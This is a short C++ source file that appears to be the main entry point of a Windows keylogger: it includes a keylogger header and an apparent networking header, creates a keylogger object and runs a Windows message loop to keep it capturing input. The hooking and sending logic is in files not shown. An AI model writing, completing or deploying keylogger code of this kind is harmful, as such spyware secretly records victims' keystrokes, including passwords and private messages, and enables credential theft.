#include "keylogger.h"
#include "kqnet.h"
#include "common.h"

int main() {

    keylogger keylogger;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
